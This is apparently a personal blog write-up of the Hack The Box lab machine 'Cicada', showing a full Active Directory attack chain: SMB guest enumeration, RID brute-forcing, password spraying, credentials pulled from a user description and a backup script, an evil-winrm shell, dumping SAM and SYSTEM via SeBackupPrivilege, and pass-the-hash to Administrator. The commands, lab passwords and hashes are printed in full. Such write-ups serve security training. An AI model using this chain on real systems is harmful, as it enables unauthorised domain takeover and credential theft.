+++
date = '2025-02-15T14:01:17-05:00'
draft = false
title = 'HtB Cicada'
tags = ['writeup','hackthebox','windows','easy','active directory']
hideToc = false
+++
![HtB-Cicada](/images/Cicada.png)

## Scanning

### nmap

```sh
┌──(pl4stic㉿kali)-[~/htb/cicada]
└─$ nmap -T4 -p- -A 10.129.84.61
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-14 12:38:00Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.007 days (since Fri Feb 14 00:29:26 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

I'll go ahead and update my `/etc/hosts` file with the information we gathered in the nmap scan:
`echo "10.129.84.61    cicada.htb CICADA-DC.cicada.htb" >> /etc/hosts`

### SMB

It seems guest access to the SMB shares is enabled, lucky us.

```sh
┌──(pl4stic㉿kali)-[~/htb/cicada]
└─$ smbmap -H 10.129.84.61 -d cicada.htb -u guest -p ''

[+] IP: 10.129.84.61:445        Name: cicada.htb           Status: Authenticated
        Disk                                 Permissions     Comment
        ----                                 -----------     -------
        ADMIN$                               NO ACCESS       Remote Admin
        C$                                   NO ACCESS       Default share
        DEV                                  NO ACCESS
        HR                                   READ ONLY
        IPC$                                 READ ONLY       Remote IPC
        NETLOGON                             NO ACCESS       Logon server share 
        SYSVOL                               NO ACCESS       Logon server share
```

We can connect to `DEV`, but do not have any READ access.

```sh
┌──(pl4stic㉿kali)-[~/htb/cicada]
└─$ smbclient \\\\10.129.84.61\\HR 
Password for [WORKGROUP\pl4stic]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 08:29:09 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024

                4168447 blocks of size 4096. 416335 blocks available
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (12.0 KiloBytes/sec) (average 12.0 KiloBytes/sec)
```

### Notice from HR.txt

```txt
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

## Initial Access

### User Enumeration

Remembering that we have guest access to SMB, let's try using `netexec` to enumerate the users on this machine. Unfortunately, the standard `--users` flag doesn't work, so we have to use `--rid-brute`.

```sh
┌──(pl4stic㉿kali)-[~/htb/cicada]
└─$ netexec smb 10.129.84.61 -u guest -p '' --rid-brute
SMB         10.129.84.61    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.84.61    445    CICADA-DC        [+] cicada.htb\guest: 
[...snip...]
SMB         10.129.84.61    445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.129.84.61    445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.129.84.61    445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
[...snip...]
SMB         10.129.84.61    445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
[...snip...]
SMB         10.129.84.61    445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.129.84.61    445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.129.84.61    445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.129.84.61    445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
[...snip...]
SMB         10.129.84.61    445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

Now we've got a list of usernames... let's pull them out and place them in `users.txt`.

### Password Spraying

Let's try that password from the file in the `HR` SMB share with all of the usernames we've found. Looks like we have a new employee who hasn't changed his password yet.

```sh
┌──(pl4stic㉿kali)-[~/htb/cicada]
└─$ netexec smb 10.129.84.61 -d cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
SMB         10.129.84.61    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.84.61    445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.84.61    445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.84.61    445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.84.61    445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.84.61    445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.84.61    445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.84.61    445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

And a working set of credentials: `CICADA\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`

### Bloodhound

Let's use our new credentials and take a look at the domain structure.

```sh
┌──(pl4stic㉿kali)-[~/htb/cicada]
└─$ bloodhound-python -c all -d cicada.htb -ns 10.129.84.61 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: cicada.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: cicada-dc.cicada.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: cicada-dc.cicada.htb
INFO: Found 9 users
INFO: Found 54 groups
INFO: Found 3 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: CICADA-DC.cicada.htb
INFO: Done in 00M 05S
```

Looking at the properties for the domain users, I found something very helpful in the "Description" for `david.orelious`.

![cicada1](/images/cicada1.png)

Now we have another credential: `CICADA\david.orelious:aRt$Lp#7t*VQ!3`

### SMB (DEV)

Using the `david.orelious` credentials, we now have access to the `DEV` SMB share.

```sh
┌──(pl4stic㉿kali)-[~/htb/cicada]
└─$ netexec smb 10.129.84.61 -d cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
SMB         10.129.84.61    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.84.61    445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB         10.129.84.61    445    CICADA-DC        [*] Enumerated shares
SMB         10.129.84.61    445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.84.61    445    CICADA-DC        -----           -----------     ------
SMB         10.129.84.61    445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.84.61    445    CICADA-DC        C$                              Default share
SMB         10.129.84.61    445    CICADA-DC        DEV             READ            
SMB         10.129.84.61    445    CICADA-DC        HR              READ            
SMB         10.129.84.61    445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.84.61    445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.129.84.61    445    CICADA-DC        SYSVOL          READ            Logon server share
```

Once we login, there's one file which we grab: `Backup_script.ps1`

```sh
┌──(pl4stic㉿kali)-[~/htb/cicada]
└─$ smbclient \\\\10.129.84.61\\DEV -U david.orelious%'aRt$Lp#7t*VQ!3'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 08:31:39 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 13:28:22 2024

                4168447 blocks of size 4096. 435223 blocks available
smb: \> get Backup_script.ps1
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (5.7 KiloBytes/sec) (average 5.7 KiloBytes/sec)
```

### Backup_script.ps1

And would you look at that, another credential in the script.

```PowerShell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

`CICADA\emily.oscars:Q!3@Lp#M6b*7t*Vt`

### Shell as emily.oscars

From our Bloodhound enumeration, we noticed `emily.oscars` has `CanPSRemote` access to the machine.

![cicada2](/images/cicada2.png)

```sh
┌──(pl4stic㉿kali)-[~/htb/cicada]
└─$ evil-winrm -i 10.129.84.61 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents>
```

## Privilege Escalation

### Enumeration

```PowerShell
*Evil-WinRM* PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Looks like Emily has both the `SeBackupPrivilege` and `SeRestorePrivilege`, which are good possibilities for privilege escalation.

### SeBackupPrivilege

I found a nice article [here](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) that outlines how to take advantage of the `SeBackupPrivilege` to make copies of the `SAM` and `SYSTEM` files, in order to extract secrets from the machine.

```PowerShell
*Evil-WinRM* PS C:\> reg save hklm\sam C:\Temp\sam.bak
The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\system C:\Temp\system.bak
The operation completed successfully.

*Evil-WinRM* PS C:\> cd Temp

*Evil-WinRM* PS C:\Temp> download sam.bak
                                        
Info: Downloading C:\Temp\sam.bak to sam.bak
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Temp> download system.bak
                                        
Info: Downloading C:\Temp\system.bak to system.bak
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Temp>
```

Now that we have the `SAM` and `SYSTEM` files, we can use a tool like `secretsdump` to extract the hashes stored on the system.

```sh
┌──(pl4stic㉿kali)-[~/htb/cicada]
└─$ impacket-secretsdump LOCAL -sam sam.bak -system system.bak
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```

### Shell as Administrator

Let's try using the hash to login as `Administrator`.

```sh
┌──(pl4stic㉿kali)-[~/htb/cicada]
└─$ evil-winrm -i 10.129.84.61 -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341 

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
cicada\administrator
```